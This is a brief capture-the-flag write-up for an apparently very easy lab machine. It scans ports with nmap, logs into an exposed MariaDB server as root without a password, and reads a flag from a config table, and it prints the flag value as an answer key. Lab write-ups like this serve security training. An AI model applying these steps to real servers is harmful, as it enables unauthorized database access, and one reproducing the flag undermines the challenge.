System: Linux
Difficulty: Very Easy

IP Address: 10.129.151.216

# System Flag

Ports are enumerated through NMAP.
```
kali@kali:~$ sudo nmap 10.129.151.216 -sC -sV
```

A MySQL Port has been detected in the output.
```
<SNIP>
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
```

This command is used to connect as the default user on MySQL.
```
kali@kali:~$ mysql -h 10.129.151.216 -P 3306 -u 'root'
```

The attacker is now connected to the database session.
The databases are examined.
```
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
```

The irregular database `htb` is selected as main database.
```
MariaDB [(none)]> use htb;
```

Now its tables are enumerated.
```
MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
```

The `config` table is then examined.
```
MariaDB [htb]> select * from config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
```

The flag contents is below.
```
7b4bec00d1a39e3dd4e021ec3d915da8
```